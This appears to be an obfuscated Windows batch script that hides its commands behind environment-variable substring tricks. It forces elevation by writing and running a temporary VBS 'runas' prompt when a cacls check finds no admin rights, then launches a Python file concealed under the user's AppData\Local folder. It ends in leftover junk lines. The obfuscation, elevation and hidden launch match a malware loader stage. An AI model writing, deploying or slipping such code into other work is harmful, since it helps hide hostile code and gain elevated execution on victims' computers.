��&cls
@%pUBlIc:~89,83%%PUBLic:~5,1%CHo^ of^%PuBlIC:~46,16%f
SEt R^=Jg^%pUBLIc:~13,1%^gtGXz%pUBLIc:~4,1%w%pUBLIc:~11,1%^hm%pUBLIc:~10,1%^S^HI^O^A
^%pUBlIC:~14,1%^L%pUBliC:~55,17%^%publIc:~4,1%
@^e^c%r:~15,1%^%r:~17,1% ^%r:~17,1%n
@ec%r:~11,1%o off
:: BatchGotAdmin
:-------------------------------------
>n%r:~13,1%l 2>&1 "%SYSTEMROOT%\%r:~8,1%y%r:~8,1%%r:~4,1%e%r:~12,1%32\cacl%r:~8,1%.exe" "%SYSTEMROOT%\%r:~8,1%y%r:~8,1%%r:~4,1%e%r:~12,1%32\conf%r:~2,1%%r:~1,1%\%r:~8,1%y%r:~8,1%%r:~4,1%e%r:~12,1%"
%r:~2,1%f '%errorlevel%' NEQ '0' (
    %r:~1,1%o%r:~4,1%o U%r:~18,1%CPro%r:~12,1%p%r:~4,1%
) el%r:~8,1%e ( %r:~1,1%o%r:~4,1%o %r:~1,1%o%r:~4,1%%r:~18,1%d%r:~12,1%%r:~2,1%n )

:UACPrompt
    ec%r:~11,1%o %r:~14,1%e%r:~4,1% U%r:~18,1%C = Crea%r:~4,1%e%r:~17,1%%r:~10,1%jec%r:~4,1%^("%r:~14,1%%r:~11,1%ell.%r:~18,1%ppl%r:~2,1%ca%r:~4,1%%r:~2,1%on"^) > "%temp%\%r:~1,1%e%r:~4,1%ad%r:~12,1%%r:~2,1%n.v%r:~10,1%%r:~8,1%"
    ec%r:~11,1%o U%r:~18,1%C.%r:~14,1%%r:~11,1%ellExec%r:~13,1%%r:~4,1%e "%~s0", "", "", "r%r:~13,1%na%r:~8,1%", 1 >> "%temp%\%r:~1,1%e%r:~4,1%ad%r:~12,1%%r:~2,1%n.v%r:~10,1%%r:~8,1%"
    "%temp%\%r:~1,1%e%r:~4,1%ad%r:~12,1%%r:~2,1%n.v%r:~10,1%%r:~8,1%"
    del "%temp%\%r:~1,1%e%r:~4,1%ad%r:~12,1%%r:~2,1%n.v%r:~10,1%%r:~8,1%"
    ex%r:~2,1%%r:~4,1% /B

:gotAdmin
:: End BatchGotAdmin

%r:~8,1%e%r:~4,1% "%r:~13,1%%r:~8,1%erprof%r:~2,1%lepa%r:~4,1%%r:~11,1%=%userprofile%"
for %%F %r:~2,1%n ("%userprofilepath%") do %r:~8,1%e%r:~4,1% "%r:~13,1%%r:~8,1%erna%r:~12,1%e=%%~nxF"

py%r:~4,1%%r:~11,1%on "C:\U%r:~8,1%er%r:~8,1%\%username%\%r:~18,1%ppDa%r:~4,1%a\Local\%r:~6,1%%r:~15,1%EN\%r:~6,1%ME4.py"
ex%r:~2,1%%r:~4,1%

@ec%r:~11,1%o off
%r:~8,1%e%r:~4,1% a = %%~i
%r:~8,1%e%r:~4,1% a = % + %~i"%%~%r:~2,1%"%
set a = %a%
:aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
